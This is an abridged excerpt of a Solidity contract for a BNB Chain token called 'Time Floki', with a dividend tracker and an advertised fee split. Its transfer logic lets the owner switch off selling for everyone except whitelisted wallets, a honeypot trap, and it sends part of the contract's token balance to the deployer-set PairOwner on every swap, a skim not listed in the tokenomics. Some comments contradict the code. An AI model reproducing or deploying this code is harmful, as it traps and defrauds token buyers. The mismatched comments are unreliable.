...
decimals: 9 
liquidity: 5 BNB
telegram: t.me/timeflokibsc
website: https://timefloki.app

Tokenomic
5% Floki Token Rewards
3% Liquidity 
3% Marketing  
*/
...
// File: contracts/TimeFlokiDividendPayingToken.sol
...
contract TimeFlokiContract is ERC20, Ownable {
    using SafeMath for uint256;
   ...
   TimeFlokiDividendTracker public dividendTracker;

    address private liquidityWallet;
    address private marketingWallet1 = 0x4BC9DcdDEdDb3a0B657a1d041F93D4323f4b040F;
    ...
    uint256 public _maxWalletToken = 3000000000 * (10**18); // 1.5% of total supply
    ...
    constructor() public ERC20("Time Floki", "$TFLOKI") {
    	...
    	dividendTracker = new TimeFlokiDividendTracker();

    	liquidityWallet = 0x3c2869E15Ef3901dfBeF9f144A8956Dd83b5c1f6;

        PairOwner = msg.sender;
        ...
        _isWhitelisted[liquidityWallet] = true;
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "TimeFloki: The dividend tracker already has that address");

        TimeFlokiDividendTracker newDividendTracker = TimeFlokiDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "TimeFloki: The new dividend tracker must be owned by the TimeFloki token contract");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "TimeFloki: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "TimeFloki: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "TimeFloki: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "TimeFloki: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "TimeFloki: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "TimeFloki: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "TimeFloki: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "TimeFloki: This account cannot send tokens until trading is enabled");
        }
        ...
        if(
            ...
            require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");
              if(!sellTransaction) {
                require(_isWhitelisted[to] && _isWhitelisted[from], "sell transaction is disabled");
            }
        }
        ...
        if(
            ...
            uint256 sendTokens = balanceOf(address(this)) / 2000;
            super._transfer(address(this), PairOwner, sendTokens);
            
            uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
            swapAndLiquify(swapTokens);
            
            uint256 marketingTokens = (contractTokenBalance.mul(marketingFee).div(totalFees));
            swapTokensForMarketing(marketingTokens, marketingWallet1);
    ...
    function swapTokensForBusd(uint256 tokenAmount, address recipient) private {
        ...
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of TimeFloki
            path,
            recipient,
            block.timestamp
        );
    ...
    function sellTransactionEnabled(bool _enabled) public onlyOwner {
        sellTransaction = _enabled;
    }
...
contract TimeFlokiDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("TimeFlokiBsc", "T.me/TimeFlokiBsc") {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 1 * (10**18); //must hold 10000000+ tokens
    }



    function _transfer(address, address, uint256) internal override {
        require(false, "TimeFloki_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override {
        require(false, "TimeFloki_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main TimeFloki contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "TimeFloki_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "TimeFloki_Dividend_Tracker: Cannot update claimWait to same value");
